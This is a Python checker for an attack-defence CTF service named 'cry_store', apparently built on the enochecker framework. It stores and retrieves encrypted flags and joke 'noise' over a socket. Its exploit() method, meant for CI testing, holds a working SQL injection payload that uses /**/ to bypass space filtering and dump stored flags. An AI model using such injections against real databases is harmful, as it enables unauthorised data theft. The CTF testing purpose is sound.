
#!/usr/bin/env python3
from enochecker import *

import binascii
from binascii import unhexlify, hexlify

from Crypto.PublicKey import RSA
from Crypto.Cipher import DES
from Crypto.Util.number import long_to_bytes, bytes_to_long
from hashlib import sha256
import random

from crypto import decrypt, encrypt, sign, verify

private_key = RSA.importKey(open('checker.privkey','r').read())

class CryStoreChecker(BaseChecker):
	"""
	Change the methods given here, then simply create the class and .run() it.
	Magic.
	A few convenient methods and helpers are provided in the BaseChecker.
	ensure_bytes ans ensure_unicode to make sure strings are always equal.
	As well as methods:
	self.connect() connects to the remote server.
	self.get and self.post request from http.
	self.team_db is a dict that stores its contents to filesystem. (call .persist() to make sure)
	self.readline_expect(): fails if it's not read correctly
	To read the whole docu and find more goodies, run python -m pydoc enochecker
	(Or read the source, Luke)
	"""

	flag_variants 	= 1
	noise_variants	= 1
	havoc_variants	= 0
	exploit_variants= 1
	service_name = "cry_store"
	port = 9122  # The port will automatically be picked up as default by self.connect and self.http.

	def flag_key(self):
		return f"flag_{self.related_round_id}:{self.variant_id}"

	def putflag(self):  # type: () -> None
		"""
			This method stores a flag in the service.
			In case multiple flags are provided, self.flag_idx gives the appropriate index.
			The flag itself can be retrieved from self.flag.
			On error, raise an Eno Exception.
			:raises EnoException on error
			:return this function can return a result if it wants
					if nothing is returned, the service status is considered okay.
					the preferred way to report errors in the service is by raising an appropriate enoexception
		"""
		try:
			if self.variant_id == 0:
				self.get_pubkey()
				key = RSA.import_key(self.team_db['pubkey'])

				conn = self.connect()
				expect_command_prompt(conn)

				content = 'flag %s %d' % (encrypt(self.flag, key), self.related_round_id)
				signature = sign(content, private_key)

				input_data = ('store %s %s' % (content, signature)).encode()
				conn.write(input_data + b"\n")
				self.debug(f"Sent msg to client: {input_data}")

				try:
					ret = expect_command_prompt(conn).decode().strip().split(":")
					ret_hash = ret[0]
					ret_id = ret[1]
				except IndexError:
					conn.close()
					raise BrokenServiceException("Failed to parse hash")

				conn.close()

				self.debug(f"FLAG-hash: {sha256(self.flag.encode()).hexdigest().encode()}, returned {ret_hash.strip().encode()}")
				if sha256(self.flag.encode()).hexdigest() != ret_hash.strip():
					raise BrokenServiceException('Returned wrong hash')


				self.team_db[self.flag_key()] = ret_id
				return f"Id: {ret_id}"

			else:
				raise BrokenCheckerException("Invalid variant_id")
		except EOFError:
			raise OfflineException("Encountered unexpected EOF")
		except UnicodeError:
			self.debug("UTF8 Decoding-Error")
			raise BrokenServiceException("Fucked UTF8")

	
	def get_pubkey(self):
		conn = self.connect()
		expect_command_prompt(conn)
		conn.write(b"send_pubkey\n")
		ret_value = expect_command_prompt(conn).decode()
		try:
			self.debug(f"KEY: {ret_value}")
			key = RSA.import_key(ret_value)
		except ValueError:
			raise BrokenServiceException('Invalid public key')
		conn.close()

		#store pubkey as string
		self.team_db['pubkey'] = ret_value

	def getflag(self):  # type: () -> None
		"""
		This method retrieves a flag from the service.
		Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
		On error, raise an EnoException.
		:raises EnoException on error
		:return this function can return a result if it wants
				if nothing is returned, the service status is considered okay.
				the preferred way to report errors in the service is by raising an appropriate enoexception
		"""
		try:
			if self.variant_id == 0:
				conn = self.connect()
				expect_command_prompt(conn)

				try:
					flag_id = self.team_db[self.flag_key()]
				except KeyError:
					raise BrokenServiceException("Checked flag was not successfully deployed")

				conn.write(f"load {flag_id}\n".encode())
				ciphertext = expect_command_prompt(conn).decode()
				try:
					flag = decrypt(ciphertext, privkey = private_key)
				except Exception:
					self.debug(f"Failed to decrypt {ciphertext.encode()}")
					raise BrokenServiceException("Flag-Decryption failed")

				if not flag == self.flag:
					#error might be because of updated public key, so renew it
					self.get_pubkey()
					raise BrokenServiceException("Resulting flag was found to be incorrect")
			else:
				raise BrokenCheckerException("Invalid variant_id")
		except EOFError:
			raise OfflineException("Encountered unexpected EOF")
		except UnicodeError:
			self.debug("UTF8 Decoding-Error")
			raise BrokenServiceException("Fucked UTF8")

	def noise_key(self):
		return f"noise_{self.related_round_id}:{self.variant_id}"

	def putnoise(self):  # type: () -> None
		"""
		This method stores noise in the service. The noise should later be recoverable.
		The difference between noise and flag is, that noise does not have to remain secret for other teams.
		This method can be called many times per round. Check how often using self.flag_idx.
		On error, raise an EnoException.
		:raises EnoException on error
		:return this function can return a result if it wants
				if nothing is returned, the service status is considered okay.
				the preferred way to report errors in the service is by raising an appropriate enoexception
		"""
		try:
			if self.variant_id == 0:
				joke = random.choice(open('jokes','r').read().split('\n\n'))
				joke_hex = hexlify(joke.encode()).decode()

				content = 'joke %s %d' % (joke_hex, self.related_round_id)
				signature = sign(content, private_key)

				input_data = ('store %s %s' % (content, signature)).encode()

				conn = self.connect()
				expect_command_prompt(conn)
				conn.write(input_data + b"\n")

				try:
					ret = expect_command_prompt(conn).decode().strip().split(":")
					self.debug(f"Service returned: \"{ret}\"")
					ret_hash = ret[0]
					joke_id = ret[1]
				except IndexError:
					conn.close()
					raise BrokenServiceException("Failed to parse hash")

				conn.close()
				self.debug(f"joke-hash: {sha256(joke.encode()).hexdigest().encode()}, returned {ret_hash.strip().encode()}")

				if sha256(joke.encode()).hexdigest() != ret_hash.strip():
					raise BrokenServiceException('Returned wrong hash')

				self.team_db[self.noise_key() + "joke"] = joke
				self.team_db[self.noise_key() + "joke_id"] = joke_id

			else:
				raise BrokenCheckerException("Invalid variant_id")
			
		except EOFError:
			raise OfflineException("Encountered unexpected EOF")
		except UnicodeError:
			self.debug("UTF8 Decoding-Error")
			raise BrokenServiceException("Fucked UTF8")

	def getnoise(self):  # type: () -> None
		"""
		This method retrieves noise in the service.
		The noise to be retrieved is inside self.flag
		The difference between noise and flag is, that noise does not have to remain secret for other teams.
		This method can be called many times per round. Check how often using flag_idx.
		On error, raise an EnoException.
		:raises EnoException on error
		:return this function can return a result if it wants
				if nothing is returned, the service status is considered okay.
				the preferred way to report errors in the service is by raising an appropriate enoexception
		"""
		try:
			if self.variant_id == 0:
				conn = self.connect()
				expect_command_prompt(conn)
				joke_id = self.team_db[self.noise_key() + "joke_id"]
				conn.write(f"load {joke_id}\n".encode() )
				joke_hex = expect_command_prompt(conn).decode().strip()
				self.debug(f"joke received: {joke_hex}, len {len(joke_hex)}")
				try:
					joke = unhexlify(joke_hex).decode()
				except binascii.Error:
					self.debug("failed to decode joke-hex")
					raise BrokenServiceException("Retrieved invalid joke")

				joke_orig = self.team_db[self.noise_key() + "joke"]
				self.debug(f"{joke_orig}, {joke}")
				if joke != joke_orig:
					raise BrokenServiceException("I didn't get the joke.")
				
			else:
				raise BrokenCheckerException("Invalid variant_id")
			
		except EOFError:
			raise OfflineException("Encountered unexpected EOF")
		except UnicodeError:
			self.debug("UTF8 Decoding-Error")
			raise BrokenServiceException("Fucked UTF8")
		except KeyError:
			raise BrokenServiceException("Noise not found!")

	def havoc(self):  # type: () -> None
		"""
		This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
		On error, raise an EnoException.
		:raises EnoException on Error
		:return This function can return a result if it wants
				If nothing is returned, the service status is considered okay.
				The preferred way to report Errors in the service is by raising an appropriate EnoException
		"""
		self.info("I wanted to inform you: I'm  running <3")

		# 	self.http_get(
		# 	"/"
		# )  # This will probably fail, depending on what params you give the script. :)
		raise BrokenCheckerException("Invalid variant_id")

	def exploit(self):
		"""
		This method was added for CI purposes for exploits to be tested.
		Will (hopefully) not be called during actual CTF.
		:raises EnoException on Error
		:return This function can return a result if it wants
				If nothing is returned, the service status is considered okay.
				The preferred way to report Errors in the service is by raising an appropriate EnoException
		"""

		if self.variant_id == 0:
			conn = self.connect()
			expect_command_prompt(conn)
			payload="load "
			payload+=f"-1 UNION SELECT data, id FROM store WHERE category = 'flag' ORDER BY id DESC LIMIT 1\n".replace(' ', '/**/')
			conn.write(payload.encode())

			flag_candidates = expect_command_prompt(conn)
			self.info(f"Injection returned: {flag_candidates}")
			flag_candidates = flag_candidates.split(b"\n")
			flags = []
			for flag in flag_candidates: 
				try:
					flags.append( unhexlify(flag) )
				except:
					pass
				
			self.info(f"possible flags: {flags}")
			flags = b' '.join(flags)
			return self.search_flag_bytes(flags)
		else:
			raise BrokenCheckerException("Invalid variant_id")

def expect_command_prompt(conn):
	return conn.readline_expect(b'command: ',b'command: ').split(b'command: ')[0] # need colon and space in split?

app = CryStoreChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
	run(CryStoreChecker)
	# Example params could be: [StoreFlag localhost ENOFLAG 1 ENOFLAG 50 1]
	# exit(ExampleChecker(port=1337).run())
